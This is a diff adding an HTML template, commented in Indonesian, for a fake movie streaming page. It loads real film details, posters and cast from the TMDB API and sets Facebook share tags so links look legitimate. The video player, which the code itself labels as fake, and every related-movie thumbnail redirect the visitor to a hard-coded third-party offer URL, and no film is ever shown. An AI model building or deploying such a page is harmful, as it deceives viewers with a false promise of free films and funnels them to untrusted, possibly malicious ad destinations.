@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Watch Movie</title>
+    
+    <!-- Meta Data Facebook (Default/Fallback) -->
+    <meta property="og:type" content="video.movie" />
+    <meta property="og:title" content="Watch Full Movie Online" id="og-title" />
+    <meta property="og:description" content="Stream the latest movies in HD quality." id="og-desc" />
+    <meta property="og:image" content="" id="og-img" />
+
+    <style>
+        /* CSS Reset & Variables */
+        :root {
+            --bg-color: #0b0f19;
+            --surface: #151a27;
+            --text-main: #f1f5f9;
+            --text-muted: #94a3b8;
+            --accent: #e50914; /* Red Play Button */
+        }
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            line-height: 1.4;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 8px; /* Jarak luar yang rapat */
+            display: flex;
+            flex-direction: column;
+            gap: 8px; /* Jarak antar widget sangat rapat */
+        }
+
+        /* Fake Embed Video Player */
+        .player-box {
+            position: relative;
+            width: 100%;
+            padding-top: 56.25%; /* 16:9 Aspect Ratio */
+            background-color: #000;
+            border-radius: 4px;
+            overflow: hidden;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+        }
+
+        .player-box img.backdrop {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            opacity: 0.6;
+            transition: opacity 0.3s;
+        }
+
+        .player-box:hover img.backdrop { opacity: 0.4; }
+
+        .play-btn {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 70px;
+            height: 70px;
+            background-color: var(--accent);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2;
+            transition: transform 0.2s ease, background-color 0.2s;
+            box-shadow: 0 0 20px rgba(229, 9, 20, 0.4);
+        }
+
+        .play-btn::after {
+            content: '';
+            border-top: 18px solid transparent;
+            border-bottom: 18px solid transparent;
+            border-left: 24px solid white;
+            margin-left: 6px; /* Centering fix for triangle */
+        }
+
+        .player-box:hover .play-btn {
+            transform: translate(-50%, -50%) scale(1.1);
+            background-color: #f40612;
+        }
+
+        /* Movie Info Section */
+        .info-box {
+            background-color: var(--surface);
+            padding: 12px;
+            border-radius: 4px;
+        }
+
+        .info-box h1 {
+            font-size: 1.4rem;
+            margin-bottom: 6px;
+            font-weight: 700;
+        }
+
+        .info-box .desc {
+            font-size: 0.9rem;
+            color: var(--text-muted);
+            margin-bottom: 8px;
+            display: -webkit-box;
+            -webkit-line-clamp: 3;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+
+        .info-box .cast {
+            font-size: 0.85rem;
+            color: #cbd5e1;
+            font-weight: 500;
+        }
+
+        .cast span { color: var(--text-muted); }
+
+        /* Related Movies Section */
+        .related-title {
+            font-size: 1.1rem;
+            margin: 4px 0;
+            padding-left: 4px;
+            border-left: 3px solid var(--accent);
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(6, 1fr);
+            gap: 6px; /* Jarak antar thumbnail sangat rapat */
+        }
+
+        .movie-card {
+            position: relative;
+            aspect-ratio: 2 / 3; /* Format poster 2:3 */
+            background-color: var(--surface);
+            border-radius: 4px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .movie-card:hover {
+            transform: translateY(-2px);
+        }
+
+        .movie-card img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .movie-card .card-title {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            padding: 24px 6px 6px 6px;
+            background: linear-gradient(to top, rgba(0,0,0,0.95) 0%, rgba(0,0,0,0.6) 60%, transparent 100%);
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-align: center;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .grid { grid-template-columns: repeat(3, 1fr); gap: 4px; }
+            .info-box h1 { font-size: 1.2rem; }
+            .play-btn { width: 50px; height: 50px; }
+            .play-btn::after { border-top: 12px solid transparent; border-bottom: 12px solid transparent; border-left: 18px solid white; margin-left: 5px;}
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Fake Player -->
+        <div class="player-box" onclick="redirectToOffer()">
+            <img src="" alt="Backdrop" class="backdrop" id="player-bg">
+            <div class="play-btn"></div>
+        </div>
+
+        <!-- Movie Info -->
+        <div class="info-box">
+            <h1 id="movie-title">Loading...</h1>
+            <p class="desc" id="movie-desc">Please wait while data is being fetched...</p>
+            <div class="cast">Cast: <span id="movie-cast">...</span></div>
+        </div>
+
+        <!-- Related Movies -->
+        <div class="related-title">Related Movies</div>
+        <div class="grid" id="related-grid">
+            <!-- Thumbnail digenerate via JS -->
+        </div>
+    </div>
+
+    <script>
+        // ================= PENGATURAN =================
+        const API_KEY = 'MASUKKAN_API_KEY_TMDB_ANDA_DISINI'; 
+        const TARGET_URL = 'https://spreadpreferencetelevision.com/hhqe0ruxga?key=e3ff974fd2665b1074e29d32efa30da4';
+        
+        // ID Film utama yang ingin ditampilkan (Contoh: 299534 adalah Avengers: Endgame)
+        // Anda bisa membuat ID ini dinamis mengambil dari URL parameter seperti ?id=123
+        const MOVIE_ID = '299534'; 
+        // ==============================================
+
+        // Fungsi Redirect
+        function redirectToOffer() {
+            window.location.href = TARGET_URL;
+        }
+
+        async function loadMovieData() {
+            if (API_KEY === 'MASUKKAN_API_KEY_TMDB_ANDA_DISINI') {
+                document.getElementById('movie-title').innerText = "API Key Belum Diisi";
+                return;
+            }
+
+            try {
+                // 1. Fetch Data Film Utama
+                const resMovie = await fetch(`https://api.themoviedb.org/3/movie/${MOVIE_ID}?api_key=${API_KEY}&language=en-US`);
+                const movie = await resMovie.json();
+
+                // 2. Fetch Data Cast (Pemeran)
+                const resCast = await fetch(`https://api.themoviedb.org/3/movie/${MOVIE_ID}/credits?api_key=${API_KEY}`);
+                const credits = await resCast.json();
+
+                // 3. Fetch Data Film Terkait (Related/Similar)
+                const resRelated = await fetch(`https://api.themoviedb.org/3/movie/${MOVIE_ID}/similar?api_key=${API_KEY}&language=en-US&page=1`);
+                const related = await resRelated.json();
+
+                // Update UI: Info Film
+                document.getElementById('movie-title').innerText = movie.title;
+                document.getElementById('movie-desc').innerText = movie.overview;
+                document.getElementById('player-bg').src = `https://image.tmdb.org/t/p/w1280${movie.backdrop_path}`;
+                
+                // Ambil 5 pemeran teratas
+                const topCast = credits.cast.slice(0, 5).map(c => c.name).join(', ');
+                document.getElementById('movie-cast').innerText = topCast;
+
+                // Update UI: Meta Tags (Hanya berjalan di client-side, lihat catatan di atas)
+                document.title = `${movie.title} - Watch Free Online`;
+                document.getElementById('og-title').setAttribute('content', movie.title);
+                document.getElementById('og-desc').setAttribute('content', movie.overview);
+                document.getElementById('og-img').setAttribute('content', `https://image.tmdb.org/t/p/w780${movie.backdrop_path}`);
+
+                // Update UI: Related Movies (Acak 6 film)
+                const grid = document.getElementById('related-grid');
+                
+                // Acak array dan ambil 6 teratas
+                const shuffledMovies = related.results.sort(() => 0.5 - Math.random());
+                const selectedMovies = shuffledMovies.slice(0, 6);
+
+                selectedMovies.forEach(item => {
+                    if (item.poster_path) {
+                        const card = document.createElement('div');
+                        card.className = 'movie-card';
+                        card.onclick = redirectToOffer; // Redirect jika di klik
+                        card.innerHTML = `
+                            <img src="https://image.tmdb.org/t/p/w342${item.poster_path}" alt="${item.title}" loading="lazy">
+                            <div class="card-title">${item.title}</div>
+                        `;
+                        grid.appendChild(card);
+                    }
+                });
+
+            } catch (error) {
+                console.error("Gagal mengambil data dari API:", error);
+                document.getElementById('movie-title').innerText = "Error Loading Movie";
+            }
+        }
+
+        // Inisialisasi
+        window.onload = loadMovieData;
+    </script>
+</body>
+</html>
